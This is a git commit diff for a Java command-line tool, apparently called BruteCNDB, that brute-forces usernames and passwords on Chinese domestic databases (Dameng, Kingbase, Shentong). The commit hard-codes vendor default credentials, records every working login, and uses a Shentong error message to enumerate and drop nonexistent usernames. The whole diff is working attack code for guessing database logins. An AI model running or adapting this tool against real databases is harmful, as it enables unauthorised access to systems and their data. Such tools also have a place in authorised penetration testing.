b8b4e71e9ad658d226d6a1031f3103dfa038fefb
wenqh <nofind@vip.qq.com>
2022-01-10 18:57:14 +0800

    1. 添加debug参数，用于打印异常 2. 添加默认密码 3. 爆破成功后不再退出，继续尝试剩下的用户名密码

--- src/cn/brute/db/Main.java
+++ src/cn/brute/db/Main.java
@@ -10,18 +10,23 @@ import java.net.SocketTimeoutException;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.SQLException;
-import java.util.ArrayList;
-import java.util.HashMap;
+import java.util.*;
 
 public class Main {
 
     public static void main(String[] args) {
         try {
-            HashMap<String, String[]> dbmsMap = new HashMap<String, String[]>();
-            dbmsMap.put("dm", new String[]{"dm.jdbc.driver.DmDriver", "dm", "达梦数据库", "5326"});
+            HashMap<String, String[]> dbmsMap = new HashMap<>();
+            dbmsMap.put("dm", new String[]{"dm.jdbc.driver.DmDriver", "dm", "达梦数据库", "5236"});
             dbmsMap.put("jc", new String[]{"com.kingbase.Driver", "kingbase", "人大金仓数据库", "54321"});
             dbmsMap.put("jc8", new String[]{"com.kingbase8.Driver", "kingbase8", "人大金仓v8数据库", "54321"});
             dbmsMap.put("st", new String[]{"com.oscar.Driver", "oscar", "神通数据库", "2003"});
+
+            HashMap<String, String[][]> defaultPasswords = new HashMap<>();
+            defaultPasswords.put("dm", new String[][]{{"SYSDBA", "SYSAUDITOR"}, {"SYSDBA", "SYSAUDITOR"}});
+            defaultPasswords.put("jc", new String[][]{{"SYSTEM", "root"}, {"SYSTEM"}});
+            defaultPasswords.put("jc8", new String[][]{{"SYSTEM", "root"}, {"SYSTEM"}});
+            defaultPasswords.put("st", new String[][]{{"SYSDBA", "SYSSECURE"}, {"szoscar55"}});
 
             Options options = new Options();
             options.addOption("dbms", true, "可选项: dm - 达梦; jc - 人大金仓; jc8 - 人大金仓v8; st - 神通");
@@ -30,9 +35,10 @@ public class Main {
             options.addOption("h", true, "服务器IP");
             options.addOption("p", true, "端口，不指定则使用默认端口");
             options.addOption("i", true, "爆破间隔时长，默认为0，单位：毫秒");
+            options.addOption("debug", false, "调试模式，会打印异常");
             HelpFormatter formatter = new HelpFormatter();
             if (args.length < 2) {
-                formatter.printHelp("java -jar BruteCNDB.jar -dbms dm -h 10.0.0.1 [-p 5326] -uf user.txt -pf password.txt", options);
+                formatter.printHelp("java -jar BruteCNDB.jar -dbms dm -h 10.0.0.1 [-p 5236] [-uf user.txt] [-pf password.txt]", options);
                 System.exit(1);
             }
             CommandLineParser parser = new DefaultParser();
@@ -48,64 +54,79 @@ public class Main {
             Class.forName(dbmsMap.get(dbms)[0]);
             String url = String.format("jdbc:%s://%s:%s/", dbmsMap.get(dbms)[1], host, port);
 
-            ArrayList<String> userList = null;
-            ArrayList<String> pwdList = null;
+            LinkedHashSet<String> userDict = new LinkedHashSet<>();
+            LinkedHashSet<String> pwdDict = new LinkedHashSet<>();
             try {
-                userList = getListFromFile(cmd.hasOption("uf")?cmd.getOptionValue("uf"):"user.txt");
-                pwdList = getListFromFile(cmd.hasOption("pf")?cmd.getOptionValue("pf"):"password.txt");
+                userDict = getListFromFile(cmd.hasOption("uf") ? cmd.getOptionValue("uf") : "user.txt");
+                pwdDict = getListFromFile(cmd.hasOption("pf") ? cmd.getOptionValue("pf") : "password.txt");
             } catch (IOException e) {
                 e.printStackTrace();
             }
-            int total = userList.size() * pwdList.size();
+            userDict.addAll(Arrays.asList(defaultPasswords.get(dbms)[0]));
+            pwdDict.addAll(Arrays.asList(defaultPasswords.get(dbms)[1]));
+
+            int total = userDict.size() * pwdDict.size();
             int index = 1;
+            HashMap<String, String> availbleUserPasswords = new HashMap<>();
             System.out.println(String.format("开始爆破%s！由于是单线程，速度会比较慢....", dbmsMap.get(dbms)[2]));
-            boolean success = false;
-            for (String passwd : pwdList) {
-                for (String userID : userList) {
+            Iterator<String> pwdIterator = pwdDict.iterator();  // 由于神通数据库的原因，必须要用Iterator循环而不是ForEach
+            while (pwdIterator.hasNext()) {
+                String pwd = pwdIterator.next();
+                Iterator<String> userIterator = userDict.iterator();
+                while (userIterator.hasNext())  {
+                    String user = userIterator.next();
                     try {
                         // 简单粗暴的百分比判断，复制粘贴就完事儿
-                        Connection connection = DriverManager.getConnection(url, userID, passwd);
+                        Connection connection = DriverManager.getConnection(url, user, pwd);
                         if (index == total * 0.1 || index == total * 0.2 || index == total * 0.3 || index == total * 0.4 || index == total * 0.5 || index == total * 0.6 || index == total * 0.7 || index == total * 0.8 || index == total * 0.9)
                             System.out.println(String.format("进度：%d%%", index * 100 / total));
                         index += 1;
-                        System.out.println(String.format("[!] Username: %s, password: %s", userID, passwd));
+                        System.out.println(String.format("[!] Username: %s, password: %s", user, pwd));
                         connection.close();
-                        success = true;
-                        System.exit(0);
+                        availbleUserPasswords.put(user, pwd);
                     } catch (SQLException e) {
-//                      e.printStackTrace();
                         if (e.getCause() instanceof SocketTimeoutException) {
                             System.out.println("[x] Socket连接超时");
                         } else if (e.getMessage().contains("不存在") && cmd.getOptionValue("dbms").contains("jc")) {
                             // 金仓数据库密码正确但数据库名错误时会提示"xxx"数据库不存在
-                            System.out.println(String.format("[!] Username: %s, password: %s", userID, passwd));
-                            success = true;
-                            System.exit(0);
+                            System.out.println(String.format("[!] Username: %s, password: %s", user, pwd));
+                            availbleUserPasswords.put(user, pwd);
                         } else if (e.getMessage().contains("timed out") && cmd.getOptionValue("dbms").contains("st")) {
                             // 神通数据库连接超时会报OSSQLException异常而不是java默认的SocketTimeoutException
                             System.out.println("[x] 连接神通数据库超时");
+                        } else if (e.getMessage().contains("用户") && e.getMessage().contains("不存在") && cmd.getOptionValue("dbms").contains("st")) {
+                            /* 神通数据库可以枚举用户名，用户名不存在时异常信息中会有提示，
+                            使用Iterator循环可以在检测到用户名不存在时将其从用户名列表中剔除，避免做无用功，
+                            而ForEach循环就不能直接删除集合中的元素 */
+                             userIterator.remove();
+                             userDict.remove(user);
+                        } else if (cmd.hasOption("debug")) {
+                            e.printStackTrace();
                         }
                     }
                     Thread.sleep(interval);
                 }
             }
-            if (!success) System.out.println("不好意思，没爆出来。。。");
+            if (availbleUserPasswords.isEmpty()) System.out.println("不好意思，没爆出来。。。");
+            else {
+                availbleUserPasswords.forEach((user, pwd) -> {
+                    System.out.println("Username: " + user + "\tPassword:" + pwd);
+                });
+            }
 
-        } catch (ParseException e) {
+        } catch (ParseException | InterruptedException e) {
             e.printStackTrace();
         } catch (ClassNotFoundException e) {
             System.out.println("缺少对应数据库的JDBC驱动");
             e.printStackTrace();
-        } catch (InterruptedException e) {
-            e.printStackTrace();
         }
     }
 
-    public static ArrayList<String> getListFromFile(String filename) throws IOException {
+    public static LinkedHashSet<String> getListFromFile(String filename) throws IOException {
         FileInputStream fis = new FileInputStream(filename);
         BufferedReader br = new BufferedReader(new InputStreamReader(fis));
         String line;
-        ArrayList<String> lines = new ArrayList<>();
+        LinkedHashSet<String> lines = new LinkedHashSet<>();
         while ((line = br.readLine()) != null) {
             lines.add(line.strip());
         }
